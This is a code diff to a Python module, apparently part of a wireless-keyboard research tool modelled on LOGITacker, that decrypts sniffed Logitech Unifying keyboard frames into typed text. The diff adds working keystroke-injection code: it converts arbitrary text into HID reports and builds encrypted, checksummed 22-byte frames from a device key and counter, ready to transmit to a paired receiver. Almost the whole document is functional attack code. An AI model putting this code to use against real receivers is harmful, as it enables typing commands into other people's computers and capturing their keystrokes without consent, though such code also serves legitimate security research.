@@ -503,9 +503,8 @@ def esb_decrypt_keyboard_frame(device_key: bytes, payload: bytes):
 # --- HID keyboard report -> text (US layout) --------------------------------
 #
 # USB HID usage IDs (HID Usage Tables, keyboard page, table 12), as enumerated
-# in LOGITacker's logitacker_keyboard_map.h (Marcus Mengs, mame82). This is a
-# US (ANSI) layout: other
-# layouts (e.g. DK) remap the symbol/102nd keys and would need their own table.
+# in LOGITacker's logitacker_keyboard_map.h (Marcus Mengs, mame82). US (ANSI)
+# base; DK (ISO) is layered on top via _HID_DK_OVERRIDES below.
 # A decrypted keyboard report is 8 bytes: [modifiers][reserved][keycode x6].
 
 def _build_hid_us():
@@ -588,7 +587,7 @@ def hid_report_to_keys(report: bytes, prev_keys=None, layout: str = "us"):
     down-transition is emitted -- that reconstructs what was actually typed."""
     prev = prev_keys or set()
     mod = report[0]
-    keys = [k for k in report[2:8] if k > 0x03]
+    keys = [k for k in report[2:7] if k > 0x03]   # [7] is Logitech's 0xC9 sentinel, not a key
     cur = set(keys)
     text = "".join(_render_key(k, mod, layout) for k in keys if k not in prev)
     return text, cur
@@ -606,3 +605,81 @@ def esb_type_from_frames(device_key: bytes, payloads, layout: str = "us"):
         text, prev = hid_report_to_keys(rep, prev, layout)
         out.append(text)
     return "".join(out)
+
+
+# --- text -> HID reports -> encrypted keyboard frames (injection / TX side) --
+#
+# The inverse of the decrypt chain above. Mirrors mame82's
+# logitacker_unifying_crypto_encrypt_keyboard_frame (Unifying workmode):
+# 22-byte frame, data[1]=0xD3, big-endian counter at [10:14], plaintext report
+# at [2:10] with data[9] forced to the 0xC9 sentinel, XOR of frame_key[0:8],
+# then the Logitech checksum as the last byte. LIGHTSPEED (G-series) workmode is
+# not built here. Encrypted keyboards carry 5 simultaneous keys (report[2:7]).
+
+def _reverse_layout(layout: str = "us"):
+    """char -> (keycode, needs_shift) for the given layout. Lower keycodes win,
+    so the main rows beat the keypad duplicates of '/','-','+','.' etc."""
+    rev = {}
+    for code in sorted(_HID_LAYOUTS.get(layout, _HID_US)):
+        v = _HID_LAYOUTS[layout][code]
+        if not isinstance(v, tuple):
+            continue
+        base, shifted = v
+        rev.setdefault(base, (code, False))
+        rev.setdefault(shifted, (code, True))
+    return rev
+
+
+def text_to_hid_reports(text: str, layout: str = "us"):
+    """Turn text into [keydown, keyup] 8-byte HID report pairs, one char at a
+    time. Returns (reports, skipped) where skipped lists characters with no key
+    in this layout (e.g. AltGr-only glyphs). report[7] is the 0xC9 sentinel."""
+    rev = _reverse_layout(layout)
+    reports, skipped = [], []
+    for ch in text:
+        hit = rev.get(ch)
+        if hit is None:
+            skipped.append(ch)
+            continue
+        code, shift = hit
+        rep = bytearray(8)
+        rep[0] = 0x02 if shift else 0x00          # left shift
+        rep[2] = code
+        rep[7] = 0xC9                             # Logitech sentinel
+        reports.append(bytes(rep))
+        reports.append(bytes([0, 0, 0, 0, 0, 0, 0, 0xC9]))   # key release
+    return reports, skipped
+
+
+def esb_encrypt_keyboard_frame(device_key: bytes, report: bytes, counter: int) -> bytes:
+    """Build one 22-byte encrypted keyboard frame from an 8-byte HID report and
+    a 32-bit counter (Unifying workmode: big-endian counter bytes)."""
+    f = bytearray(22)
+    f[1] = 0xD3
+    cb = counter.to_bytes(4, "big")
+    f[10:14] = cb
+    fk = unifying_frame_key(device_key, cb)
+    f[2:10] = bytes(report[:8])
+    f[9] = 0xC9                                   # sentinel, overwrites report[7] pre-XOR
+    for i in range(8):
+        f[2 + i] ^= fk[i]
+    f[21] = (-sum(f[:21])) & 0xFF                 # Logitech checksum: whole frame sums to 0
+    return bytes(f)
+
+
+def esb_build_keyboard_frames(device_key: bytes, text: str, layout: str = "us",
+                              start_counter: int = 0, device_index: int = 0):
+    """Build the encrypted keyboard frames that type `text` on a receiver paired
+    with `device_key`. Returns (frames, skipped): frames is the list of 22-byte
+    payloads (counter incrementing from start_counter), skipped the characters
+    with no key in `layout`. The caller transmits them in order on the device's
+    address; the firmware owns counter sync and frame timing."""
+    reports, skipped = text_to_hid_reports(text, layout)
+    frames, ctr = [], start_counter
+    for rep in reports:
+        f = bytearray(esb_encrypt_keyboard_frame(device_key, rep, ctr))
+        f[0] = device_index & 0xFF
+        f[21] = (-sum(f[:21])) & 0xFF             # checksum after device index set
+        frames.append(bytes(f))
+        ctr += 1
+    return frames, skipped
